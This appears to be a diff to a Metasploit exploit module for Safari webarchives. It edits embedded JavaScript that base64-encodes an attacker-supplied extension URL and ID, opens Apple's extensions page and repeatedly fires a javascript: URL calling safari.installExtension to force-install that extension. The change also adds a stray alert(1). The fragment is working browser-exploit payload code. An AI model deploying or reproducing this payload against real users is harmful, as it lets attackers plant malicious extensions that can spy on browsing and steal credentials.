@@ -125,15 +125,19 @@ module Webarchive
       var extURL = atob('#{Rex::Text.encode_base64(datastore['EXTENSION_URL'])}');
       var extID = atob('#{Rex::Text.encode_base64(datastore['EXTENSION_ID'])}');
 
-      window.onclick = function(){
-        x = window.open('#{apple_extension_url}', 'x');
-
-        function go(){
-          window.focus();
-          window.open('javascript:safari&&(safari.installExtension\|\|(window.top.location.href.match(/extensions/)&&window.top.location.reload(false)))&&(safari.installExtension("'+extID+'", "'+extURL+'"), window.close());', 'x')
-        }
+      function go(){
+        window.focus();
+        window.open('javascript:safari&&(safari.installExtension\|\|(window.top.location.href.match(/extensions/)&&window.top.location.reload(false)))&&(safari.installExtension("'+extID+'", "'+extURL+'"), window.close());', 'x')
+      }
+      if (!window.x){
+        alert(1);
+        window.onclick = function(){
+          x = window.open('#{apple_extension_url}', 'x');
+          setInterval(go, 400);
+        };
+      } else {
         setInterval(go, 400);
-      };
+      }
 
       |
     end
